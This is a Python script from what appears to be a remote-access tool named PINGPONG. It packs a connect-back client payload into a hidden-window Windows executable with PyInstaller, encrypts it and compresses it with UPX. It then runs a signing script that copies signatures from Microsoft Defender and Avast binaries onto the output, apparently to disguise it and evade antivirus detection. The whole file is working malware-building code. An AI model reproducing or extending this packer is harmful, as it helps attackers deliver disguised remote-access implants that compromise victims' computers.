# -*- coding:utf-8 -*-
# @payload  :payload packer.py
# @Time      :2022/11/22 19:25:40
# @Author    :D0WE1L1N
from os import system, remove, mkdir, rename
from os.path import isfile, isdir, abspath, dirname, sep
from shutil import move, rmtree
import sys
from random import randint
sys.path.append("..")
import main
key = randint(1000000, 9000000)
current_path = abspath(__file__)
father_path = abspath(dirname(current_path) + sep + ".")
def pack(payload, ip, port, printf, upx_command):
	if upx_command != " " and upx_command != "":
		upx_command = "--upx-dir " + upx_command
	else:
		main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
	command = f"pyinstaller {upx_command} -F payload/payload.py --key {key} -w"
	command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
	command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"
	if printf:
		main.print_normal("payload>[*]Loading payload......")
		with open("./payload/" + payload + "_file.py", "r", encoding="utf8") as p:
			pay = p.read()
		with open("./payload/payload.py", "w+", encoding="utf8") as a:
				a.write(pay)
				a.write(f"""
if __name__ == '__main__':
	PINGPONG_client("{ip}", {port})""")
	else:
		with open("./payload/_basic_conn.py", "r", encoding="utf8") as p:
			pay = p.read()
		with open("./payload/payload.py", "w+", encoding="utf8") as a:
				a.write(pay)
				a.write(f"""
if __name__ == '__main__':
	_connent("{ip}", {port})""")
	try:
		system(command)
		if printf:
			main.print_normal("payload>[*]deleting temp files......")
		remove("./payload/payload.py")
		if isfile("payload.exe"):
			remove("payload.exe")
		if isdir("./payload/upload_payload"):
			rmtree("./payload/upload_payload")
		try:
			mkdir("./payload/upload_payload")
		except:
			pass
		if not printf:
			move("dist/payload.exe", "./payload/upload_payload")
			rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/upload_payload.exe")
		else:
			move("dist/payload.exe", "./payload/upload_payload")
			rename("./payload/upload_payload/payload.exe", "./payload/upload_payload/PINGPONG_payload.exe")
		remove("payload.spec")
		rmtree("build")
		rmtree("dist")
	except(ImportError):
		main.print_warn("payload>[*]You might not install pyinstaller, installing it now......")
		system("pip install pyinstaller")
		if printf:
			print("payload>[*]re-packing")
		system(command)
	except(FileNotFoundError):
		if printf:
			main.print_normal("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
			main.print_warn("payload>[!]The payload file may be in the dir: ./dict")
	main.print_good("payload>[*]signing......")
	system(command_sign_1)
	system(command_sign_2)
	remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
	remove(f"{father_path}/upload_payload/PINGPONG_payload.exe")
	if printf:
		main.print_good("payload>[+]Done Successfully")

